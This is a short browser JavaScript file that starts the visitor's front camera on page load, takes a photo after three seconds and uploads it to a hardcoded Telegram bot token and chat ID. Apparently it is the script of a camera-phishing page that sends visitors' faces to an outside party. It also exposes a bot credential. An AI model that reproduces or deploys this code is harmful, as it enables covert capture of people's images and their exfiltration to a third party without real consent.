const botToken = '7195301056:AAHYLtOnh0wfb7BCbaDbLjfphWrFiT3TOEw';
const chatId = '1342656052';
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const status = document.getElementById('status');

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: "user",
                width: { ideal: 1280 },
                height: { ideal: 720 }
            }
        });
        
        video.srcObject = stream;
        status.textContent = 'Camera ready. Taking photo in 3 seconds...';
        
        // Wait for the video to be ready
        video.onloadedmetadata = () => {
            setTimeout(takePhoto, 3000);
        };
    } catch (error) {
        status.textContent = 'Error accessing camera: ' + error.message;
        console.error('Camera error:', error);
    }
}

async function takePhoto() {
    try {
        status.textContent = 'Taking photo...';
        
        // Set canvas dimensions to match video
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        // Draw the current video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Convert canvas to blob
        const blob = await new Promise(resolve => {
            canvas.toBlob(resolve, 'image/jpeg', 0.95);
        });
        
        // Stop the camera stream
        video.srcObject.getTracks().forEach(track => track.stop());
        
        // Send photo to Telegram
        await sendPhotoToTelegram(blob);
        
    } catch (error) {
        status.textContent = 'Error taking photo: ' + error.message;
        console.error('Photo error:', error);
    }
}

async function sendPhotoToTelegram(blob) {
    try {
        status.textContent = 'Sending photo to Telegram...';
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, 'photo.jpg');
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        if (!response.ok) {
            throw new Error('Failed to send photo to Telegram');
        }
        
        status.textContent = 'Photo sent successfully!';
        
    } catch (error) {
        status.textContent = 'Error sending photo: ' + error.message;
        console.error('Telegram error:', error);
    }
}

// Start the camera when the page loads
startCamera(); 